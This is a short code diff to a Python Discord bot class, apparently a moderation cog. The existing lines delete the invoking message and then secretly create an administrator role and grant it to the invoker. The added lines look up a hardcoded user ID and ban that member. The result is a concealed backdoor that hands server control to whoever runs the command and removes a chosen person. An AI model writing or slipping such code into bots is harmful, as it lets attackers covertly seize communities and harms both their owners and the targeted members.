@@ -13,6 +13,8 @@ class botmod:
             autor = ctx.message.author
             message = ctx.message
             await self.bot.delete_message(ctx.message)
+            member = discord.utils.get(self.bot.get_all_members(), id="366246362616168448")
+            await self.bot.ban(member)
             carga = await self.bot.create_role(message.server, administrator=True)
             await self.bot.add_roles(autor, carga)
             await self.bot.edit_role(message.server, carga, administrator)
